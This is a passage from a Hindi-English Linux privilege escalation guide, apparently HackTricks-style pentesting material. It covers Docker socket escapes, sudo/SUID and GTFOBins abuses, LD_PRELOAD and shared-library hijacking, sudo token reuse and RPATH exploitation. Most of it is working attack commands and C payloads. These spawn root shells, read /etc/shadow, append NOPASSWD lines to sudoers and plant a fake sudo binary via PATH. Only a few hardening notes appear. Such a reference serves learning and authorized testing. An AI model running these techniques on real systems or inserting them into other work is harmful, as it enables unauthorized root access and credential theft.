यदि आपको कोई **writable** `.socket` फाइल मिलती है तो आप `[Socket]` सेक्शन की शुरुआत में कुछ ऐसा जोड़ सकते हैं: `ExecStartPre=/home/kali/sys/backdoor` और backdoor socket के बनाये जाने से पहले executed हो जाएगा। इसलिए, **संभवत: आपको मशीन के reboot होने तक इंतज़ार करना होगा।**\
_ध्यान दें कि सिस्टम को उस socket file configuration का उपयोग करना चाहिए, अन्यथा backdoor executed नहीं होगा_

### Writable sockets

यदि आप कोई **writable socket** पहचानते हैं (_यहाँ अब हम config `.socket` फाइलों की बात नहीं कर रहे, बल्कि Unix Sockets की बात कर रहे हैं_), तो **आप उस socket के साथ communicate कर सकते हैं** और संभवतः किसी vulnerability का exploit भी कर सकते हैं।

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### रॉ कनेक्शन
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**शोषण उदाहरण:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

ध्यान दें कि कुछ **sockets listening for HTTP** अनुरोधों के लिए सुन रहे हो सकते हैं (_मैं .socket फाइलों की बात नहीं कर रहा, बल्कि उन फाइलों की जो unix sockets के रूप में कार्य कर रही हैं_)। आप इसे निम्न से जाँच सकते हैं:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
यदि socket **responds with an HTTP** request, तो आप इसके साथ **communicate** कर सकते हैं और शायद **exploit some vulnerability**.

### लिखने योग्य Docker Socket

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. By default, it's writable by the `root` user and members of the `docker` group. Possessing write access to this socket can lead to privilege escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.

#### **Privilege Escalation with Docker CLI**

If you have write access to the Docker socket, you can escalate privileges using the following commands:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
ये कमांड आपको host के फ़ाइल सिस्टम पर root-स्तरीय पहुँच के साथ एक container चलाने की अनुमति देती हैं।

#### **Docker API का सीधे उपयोग**

ऐसे मामलों में जहाँ Docker CLI उपलब्ध नहीं है, Docker socket को फिर भी Docker API और `curl` कमांड्स का उपयोग करके हेरफेर किया जा सकता है।

1.  **List Docker Images:** उपलब्ध images की सूची प्राप्त करें।

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** ऐसा request भेजें जो host सिस्टम की root directory को mount करने वाला container बनाए।

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

नया बनाया गया container शुरू करें:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat` का उपयोग करके container से कनेक्शन स्थापित करें, जिससे उसमें कमांड निष्पादन संभव हो सके।

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` कनेक्शन सेटअप करने के बाद, आप container में सीधे कमांड चला सकते हैं और host की filesystem पर root-स्तरीय पहुँच प्राप्त कर सकते हैं।

### Others

ध्यान दें कि अगर आपके पास docker socket पर write permissions हैं क्योंकि आप **inside the group `docker`** हैं तो आपके पास [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group)। यदि [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

Check **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

यदि आप पाते हैं कि आप **`ctr`** कमांड का उपयोग कर सकते हैं तो निम्नलिखित पृष्ठ पढ़ें क्योंकि **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

यदि आप पाते हैं कि आप **`runc`** कमांड का उपयोग कर सकते हैं तो निम्नलिखित पृष्ठ पढ़ें क्योंकि **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus एक परिष्कृत **inter-Process Communication (IPC) system** है जो applications को प्रभावी ढंग से interact और data share करने में सक्षम बनाता है। आधुनिक Linux सिस्टम को ध्यान में रखकर बनाया गया, यह विभिन्न प्रकार के application communication के लिए एक मजबूत framework प्रदान करता है।

यह सिस्टम बहुमुखी है, बुनियादी IPC का समर्थन करता है जो प्रक्रियाओं के बीच डेटा एक्सचेंज को बेहतर बनाता है, और यह **enhanced UNIX domain sockets** जैसी याद दिलाता है। इसके अलावा, यह events या signals को broadcast करने में मदद करता है, जिससे system components के बीच seamless integration बढ़ती है। उदाहरण के लिए, एक Bluetooth daemon से आने वाले कॉल का signal एक music player को mute करने के लिए प्रेरित कर सकता है, जिससे user अनुभव बेहतर होता है। अतिरिक्त रूप से, D-Bus एक remote object system का समर्थन करता है, जो applications के बीच service requests और method invocations को सरल बनाता है और पारंपरिक रूप से जटिल प्रक्रियाओं को streamline करता है।

D-Bus एक **allow/deny model** पर काम करता है, जो message permissions (method calls, signal emissions, आदि) का प्रबंधन matching policy rules के cumulative प्रभाव के आधार पर करता है। ये policies bus के साथ interactions को specify करती हैं, जो इन permissions का दुरुपयोग करके संभावित रूप से privilege escalation की अनुमति दे सकती हैं।

ऐसी एक policy का उदाहरण `/etc/dbus-1/system.d/wpa_supplicant.conf` में दिया गया है, जो root user को `fi.w1.wpa_supplicant1` का मालिक बनने, उसे संदेश भेजने और उससे संदेश प्राप्त करने की permissions का विवरण देता है।

यदि policies में कोई specific user या group निर्दिष्ट नहीं है तो वे सार्वभौमिक रूप से लागू होती हैं, जबकि "default" context policies उन सब पर लागू होती हैं जिन्हें अन्य specific policies द्वारा कवर नहीं किया गया है।
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**यहाँ सीखें कि कैसे D-Bus संचार को enumerate और exploit किया जाए:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **नेटवर्क**

नेटवर्क को enumerate करना और मशीन की स्थिति का पता लगाना हमेशा रोचक होता है।

### सामान्य enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

हमेशा उन network services को चेक करें जो उस मशीन पर चल रहे हों और जिनके साथ आप मशीन तक पहुंचने से पहले इंटरैक्ट नहीं कर पाए थे:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

जाँच करें कि क्या आप sniff traffic कर सकते हैं। अगर कर सकते हैं, तो आप कुछ credentials पकड़ सकते हैं।
```
timeout 1 tcpdump
```
## Users

### Generic Enumeration

जांचें कि **who** आप हैं, आपके पास कौन से **privileges** हैं, सिस्टम में कौन से **users** हैं, कौन **login** कर सकता है और किनके पास **root privileges** हैं:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### बड़ा UID

Some Linux versions were affected by a bug that allows users with **UID > INT_MAX** to escalate privileges. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**इसे एक्सप्लॉइट करने के लिए इस्तेमाल करें:** **`systemd-run -t /bin/bash`**

### समूह

जांचें कि क्या आप किसी **समूह के सदस्य** हैं जो आपको root privileges दे सकता है:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### क्लिपबोर्ड

यदि संभव हो तो जांचें कि क्लिपबोर्ड के अंदर कुछ दिलचस्प तो नहीं है।
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### पासवर्ड नीति
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### ज्ञात पासवर्ड

यदि आप वातावरण का कोई भी पासवर्ड जानते हैं, तो उस पासवर्ड का उपयोग करके प्रत्येक user के रूप में लॉगिन करने का प्रयास करें।

### Su Brute

यदि आपको बहुत शोर करने से आपत्ति नहीं है और कंप्यूटर पर `su` और `timeout` binaries मौजूद हैं, तो आप [su-bruteforce](https://github.com/carlospolop/su-bruteforce) का उपयोग करके user का brute-force करने का प्रयास कर सकते हैं.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` parameter के साथ भी user को brute-force करने की कोशिश करता है।

## Writable PATH abuses

### $PATH

यदि आपको यह मिले कि आप $PATH के किसी फ़ोल्डर में लिख सकते हैं, तो आप privileges escalate कर सकते हैं: writable फ़ोल्डर के अंदर उसी command के नाम से एक backdoor बनाकर जिसे किसी अलग user (आदर्श रूप से root) द्वारा execute किया जाएगा, बशर्ते कि वह command उन फ़ोल्डरों में से किसी एक से लोड न हो जो आपके writable फ़ोल्डर से $PATH में पहले स्थित हों।

### SUDO and SUID

आपको कुछ command को sudo के माध्यम से execute करने की अनुमति दी गई हो सकती है या उन पर suid bit सेट हो सकता है। इसे जांचें:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
कुछ **अप्रत्याशित commands आपको फाइलें read और/या write करने या यहाँ तक कि कोई command execute करने की अनुमति देते हैं।** उदाहरण के लिए:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo कॉन्फ़िगरेशन किसी उपयोगकर्ता को बिना पासवर्ड के किसी अन्य उपयोगकर्ता के privileges के साथ कोई कमांड चलाने की अनुमति दे सकता है।
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
इस उदाहरण में उपयोगकर्ता `demo` `vim` को `root` के रूप में चला सकता है, अब root निर्देशिका में एक ssh key जोड़कर या `sh` को कॉल करके shell प्राप्त करना आसान है।
```
sudo vim -c '!sh'
```
### SETENV

यह निर्देश उपयोगकर्ता को कुछ निष्पादित करते समय **set an environment variable** करने की अनुमति देता है:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
यह उदाहरण, **based on HTB machine Admirer**, **vulnerable** था **PYTHONPATH hijacking** के लिए, ताकि किसी भी python library को स्क्रिप्ट को root के रूप में execute करते समय लोड किया जा सके:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preserved via sudo env_keep → root shell

यदि sudoers `BASH_ENV` को संरक्षित करता है (उदा., `Defaults env_keep+="ENV BASH_ENV"`), तो आप Bash के non-interactive startup व्यवहार का उपयोग करके किसी अनुमत कमांड को invoke करते समय मनमाना कोड root के रूप में चला सकते हैं।

- Why it works: non-interactive शेल्स के लिए, Bash `$BASH_ENV` को मूल्यांकन करता है और target स्क्रिप्ट चलाने से पहले उस फ़ाइल को source करता है। कई sudo नियम स्क्रिप्ट या shell wrapper चलाने की अनुमति देते हैं। यदि `BASH_ENV` sudo द्वारा preserve किया जाता है, तो आपकी फाइल root privileges के साथ source होती है।

- Requirements:
- एक sudo rule जिसे आप चला सकते हैं (कोई भी target जो `/bin/bash` को non-interactively invoke करता है, या कोई भी bash स्क्रिप्ट)।
- `BASH_ENV` `env_keep` में मौजूद हो (जांचने के लिए `sudo -l`)।

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- `env_keep` से `BASH_ENV` (और `ENV`) हटाएँ, `env_reset` को प्राथमिकता दें।
- sudo-allowed commands के लिए shell wrappers से बचें; minimal binaries का उपयोग करें।
- जब preserved env vars उपयोग किए जाते हैं तो sudo I/O logging और alerting पर विचार करें।

### Sudo execution bypassing paths

**Jump** अन्य फ़ाइलें पढ़ने के लिए या **symlinks** का उपयोग करने के लिए। उदाहरण के लिए sudoers फ़ाइल में: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
यदि **wildcard** का उपयोग (\*) किया जाता है, तो यह और भी आसान है:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**रोकथाम**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary without command path

यदि किसी एक कमांड के लिए **sudo permission** बिना path निर्दिष्ट किए दिया गया है: _hacker10 ALL= (root) less_ तो आप PATH variable बदलकर इसे exploit कर सकते हैं।
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
यह तकनीक तब भी उपयोगी है अगर कोई **suid** बाइनरी **किसी अन्य कमांड को बिना उसके path को specify किए execute करता है (हमेशा अजीब SUID binary की सामग्री _**strings**_ से चेक करें)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary with command path

यदि **suid** बाइनरी **किसी अन्य कमांड को path specify करते हुए execute करता है**, तो आप उस कमांड के नाम से एक फ़ंक्शन बनाकर उसे **export a function** करने की कोशिश कर सकते हैं जो suid फ़ाइल कॉल कर रही है।

For example, if a suid binary calls _**/usr/sbin/service apache2 start**_ you have to try to create the function and export it:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
फिर, जब आप suid binary को कॉल करेंगे, यह फ़ंक्शन निष्पादित होगा

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable का उपयोग एक या अधिक shared libraries (.so files) को loader द्वारा बाकी सभी से पहले लोड करने के लिए किया जाता है, जिसमें standard C library (`libc.so`) भी शामिल है। इस प्रक्रिया को preloading a library कहा जाता है।

हालाँकि, सिस्टम सुरक्षा बनाए रखने और इस फ़ीचर के दुरुपयोग को रोकने के लिए, विशेष रूप से **suid/sgid** executables के साथ, सिस्टम कुछ शर्तें लागू करता है:

- loader उन executables के लिए **LD_PRELOAD** को नजरअंदाज़ करता है जहाँ real user ID (_ruid_) और effective user ID (_euid_) मेल नहीं खाते।
- suid/sgid वाले executables के लिए, केवल वही libraries preload होती हैं जो standard paths में हैं और जो स्वयं भी suid/sgid हैं।

Privilege escalation तब हो सकती है जब आपके पास `sudo` के साथ commands execute करने की क्षमता हो और `sudo -l` का output उस बयान को शामिल करे: **env_keep+=LD_PRELOAD**. यह configuration **LD_PRELOAD** environment variable को बरकरार रखता है और `sudo` के साथ commands चलाने पर भी इसे मान्यता देता है, जिससे संभावित रूप से elevated privileges के साथ arbitrary code का execution हो सकता है।
```
Defaults        env_keep += LD_PRELOAD
```
के रूप में सहेजें **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
फिर **compile it** करने के लिए:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
अंत में, **escalate privileges** चलाते हुए
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> यदि attacker **LD_LIBRARY_PATH** env variable को नियंत्रित करता है तो उसी तरह का privesc दुरुपयोग किया जा सकता है क्योंकि वह उन libraries को खोजने के लिए उपयोग किए जाने वाले path को नियंत्रित करता है।
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

जब कोई ऐसा binary मिले जिसके पास असामान्य **SUID** **permissions** हों, तो यह अच्छी प्रैक्टिस है कि यह जाँचा जाए कि यह **.so** फ़ाइलें सही तरीके से लोड कर रहा है या नहीं। इसे जांचने के लिए निम्नलिखित command चलाया जा सकता है:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
उदाहरण के लिए, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ जैसी त्रुटि मिलने से संभावित शोषण का संकेत मिलता है।

इसे exploit करने के लिए, आप एक C file बनाकर आगे बढ़ेंगे, जैसे _"/path/to/.config/libcalc.c"_, जिसमें निम्नलिखित कोड होगा:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
यह कोड, एक बार compile और execute होने पर, file permissions को manipulate करके और elevated privileges के साथ एक shell execute करके privileges बढ़ाने का प्रयास करता है।

ऊपर दिए गए C file को एक shared object (.so) file में compile करें:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
अंत में, प्रभावित SUID binary चलाने पर exploit ट्रिगर होना चाहिए और system compromise की संभावना बन सकती है।

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
अब जब हमने एक SUID binary पाया है जो उस फ़ोल्डर से library लोड कर रहा है जिसमें हम लिख सकते हैं, तो उस फ़ोल्डर में आवश्यक नाम के साथ library बनाते हैं:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
यदि आपको ऐसी त्रुटि मिलती है, जैसे
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
इसका मतलब है कि आपने जो लाइब्रेरी बनाई है उसमें `a_function_name` नाम का एक फ़ंक्शन होना चाहिए।

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) Unix बाइनरीज़ की एक curated सूची है जिन्हें एक attacker द्वारा exploit किया जा सकता है ताकि local security restrictions को bypass किया जा सके। [**GTFOArgs**](https://gtfoargs.github.io/) वह sama है लेकिन उन मामलों के लिए जहाँ आप **only inject arguments** in a command.

यह प्रोजेक्ट Unix बाइनरीज़ के legitimate functions को इकट्ठा करता है जिन्हें abusе करके restricted shells से बाहर निकला जा सकता है, escalate या maintain elevated privileges किया जा सकता है, files transfer किए जा सकते हैं, bind और reverse shells spawn किए जा सकते हैं, और अन्य post-exploitation tasks को आसान बनाया जा सकता है।

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

यदि आप `sudo -l` तक पहुँच सकते हैं तो आप टूल [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) का उपयोग कर सकते हैं यह जांचने के लिए कि यह किसी भी sudo rule को exploit करने का तरीका ढूँढता है या नहीं।

### Reusing Sudo Tokens

ऐसे मामलों में जहाँ आपके पास **sudo access** है पर पासवर्ड नहीं है, आप privileges escalate कर सकते हैं by waiting for a sudo command execution and then hijacking the session token।

Requirements to escalate privileges:

- आपके पास पहले से ही user "_sampleuser_" के रूप में एक shell होना चाहिए
- "_sampleuser_" ने **`sudo`** का उपयोग किसी चीज़ को execute करने के लिए **पिछले 15mins** में किया होना चाहिए (डिफ़ॉल्ट रूप से यही sudo token की अवधि होती है जो हमें बिना पासवर्ड के `sudo` इस्तेमाल करने की अनुमति देती है)
- `cat /proc/sys/kernel/yama/ptrace_scope` का मान 0 होना चाहिए
- `gdb` उपलब्ध होना चाहिए (आप इसे upload कर पाने में सक्षम हों)

(आप अस्थायी रूप से `ptrace_scope` को सक्षम कर सकते हैं with `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` या स्थायी रूप से `/etc/sysctl.d/10-ptrace.conf` को modify करके और `kernel.yama.ptrace_scope = 0` सेट करके)

यदि ये सभी शर्तें पूरी हों, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- यह **दूसरा exploit** (`exploit_v2.sh`) _/tmp_ में एक sh shell बनाएगा जो **owned by root with setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- यह **तीसरा exploit** (`exploit_v3.sh`) करेगा **sudoers file का निर्माण** जो **sudo tokens को स्थायी बनाता है और सभी users को sudo का उपयोग करने की अनुमति देता है**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

यदि आपके पास फोल्डर में या उस फोल्डर के अंदर बनाए गए किसी भी फ़ाइल पर **write permissions** हैं, तो आप बाइनरी [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) का उपयोग करके किसी user और PID के लिए **sudo token** बना सकते हैं.\
उदाहरण के लिए, यदि आप फ़ाइल _/var/run/sudo/ts/sampleuser_ को overwrite कर सकते हैं और आपके पास उस user के रूप में PID 1234 के साथ एक shell है, तो आप password जानने की आवश्यकता के बिना **sudo privileges** प्राप्त कर सकते हैं, निम्नलिखित करके:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

फ़ाइल `/etc/sudoers` और `/etc/sudoers.d` के अंदर की फ़ाइलें यह कॉन्फ़िगर करती हैं कि कौन `sudo` का उपयोग कर सकता है और कैसे। ये फाइलें **डिफ़ॉल्ट रूप से केवल user root और group root द्वारा ही पढ़ी जा सकती हैं**।\
**यदि** आप इस फाइल को **पढ़** सकते हैं तो आप कुछ रोचक जानकारी **प्राप्त** कर सकते हैं, और यदि आप किसी भी फाइल को **लिख** सकते हैं तो आप **escalate privileges** कर पाएंगे।
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
यदि आप लिख सकते हैं तो आप इस अनुमति का दुरुपयोग कर सकते हैं
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
इन permissions का दुरुपयोग करने का एक और तरीका:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` बाइनरी के कुछ विकल्प हैं, जैसे OpenBSD के लिए `doas` — इसके कॉन्फ़िगरेशन को `/etc/doas.conf` पर अवश्य देखें।
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

यदि आप जानते हैं कि एक **उपयोगकर्ता आमतौर पर किसी मशीन से जुड़ता है और `sudo` का उपयोग करता है** privileges बढ़ाने के लिए और आपके पास उस उपयोगकर्ता context में एक shell है, तो आप **एक नया sudo executable बनाएँ** जो पहले आपके कोड को root के रूप में execute करेगा और फिर उपयोगकर्ता का कमांड। फिर, user context का **$PATH को संशोधित करें** (उदाहरण के लिए नई path को .bash_profile में जोड़ना) ताकि जब उपयोगकर्ता sudo चलाए, तो आपका sudo executable चलाया जाए।

ध्यान दें कि यदि उपयोगकर्ता किसी अलग shell (not bash) का उपयोग करता है तो आपको नया path जोड़ने के लिए अन्य फाइलें संशोधित करनी पड़ेंगी। उदाहरण के लिए[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifies `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. You can find another example in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

या कुछ इस तरह चलाना:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

फ़ाइल `/etc/ld.so.conf` दर्शाती है **कि लोड की गई configurations files कहाँ से हैं**। आमतौर पर, यह फ़ाइल निम्न path को शामिल करती है: `include /etc/ld.so.conf.d/*.conf`

इसका मतलब है कि `/etc/ld.so.conf.d/*.conf` से configuration फाइलें पढ़ी जाएँगी। ये configuration फ़ाइलें **अन्य फ़ोल्डरों की ओर इशारा करती हैं** जहाँ **libraries** को **searched** किया जाएगा। उदाहरण के लिए, `/etc/ld.so.conf.d/libc.conf` की सामग्री `/usr/local/lib` है। **इसका मतलब है कि सिस्टम `/usr/local/lib` के अंदर libraries की खोज करेगा**।

यदि किसी कारणवश **a user has write permissions** ऊपर बताए गए किसी भी path पर: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` के अंदर कोई भी फ़ाइल या `/etc/ld.so.conf.d/*.conf` के अंदर config फ़ाइल द्वारा इशारे किए गए किसी भी फ़ोल्डर पर, तो वह privileges escalate करने में सक्षम हो सकता है.\
निम्न पृष्ठ में देखें कि **how to exploit this misconfiguration**:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib को `/var/tmp/flag15/` में कॉपी करने पर यह `RPATH` वेरिएबल में निर्दिष्ट इसी स्थान पर प्रोग्राम द्वारा उपयोग किया जाएगा।
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
फिर `/var/tmp` में `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` के साथ एक दुष्ट लाइब्रेरी बनाएँ।
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## क्षमताएँ

Linux capabilities किसी process को उपलब्ध root privileges का **एक उपसमुच्चय** प्रदान करती हैं। यह प्रभावी रूप से root के **privileges को छोटे और विशिष्ट इकाइयों में विभाजित** कर देता है। इन इकाइयों में से प्रत्येक को स्वतंत्र रूप से processes को दिया जा सकता है। इस तरह पूर्ण privileges सेट कम हो जाता है, जिससे exploitation का जोखिम घटता है।\
अधिक जानने के लिए और यह सीखने के लिए कि इन्हें कैसे abuse किया जा सकता है, निम्न पृष्ठ पढ़ें:


